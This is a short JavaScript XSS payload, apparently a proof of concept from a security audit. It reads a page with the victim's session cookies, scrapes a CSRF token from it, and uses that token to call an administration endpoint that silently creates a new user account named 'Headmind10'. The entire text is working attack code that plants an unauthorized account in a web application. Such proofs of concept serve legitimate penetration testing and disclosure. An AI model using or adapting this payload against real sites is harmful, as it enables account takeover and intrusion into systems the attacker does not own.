(async () => {
  try {
    const r = await fetch('/suivi.php', { credentials: 'include' });
    const t = await r.text();
    const matches = [...t.matchAll(/token=([a-f0-9]{32})/g)];
    if (matches.length > 12) {
      const token = matches[12][1];
      const url = '/administration/saveUser.php?IdUser=0&LoginUser=Headmind10&NomUser=Auditeur10&PrenomUser=Headmind&MailUser=auditeur10@headmind.com&token=' + token;
      await fetch(url, { credentials: 'include' });
    }
  } catch (e) {
    console.error('XSS payload error:', e);
  }
})();
